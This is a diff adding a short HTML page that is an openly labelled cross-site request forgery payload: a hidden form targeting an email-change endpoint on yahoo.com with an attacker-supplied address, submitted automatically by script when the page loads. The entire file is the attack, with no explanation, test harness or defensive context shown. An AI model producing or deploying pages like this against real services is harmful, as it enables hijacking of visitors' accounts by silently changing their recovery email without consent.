@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <form action="https://yahoo.com/api/change-email" method="POST">
+      <input type="hidden" name="email" value="www.neonick@gmail.com">
+      <input type="submit" value="Отправить CSRF">
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
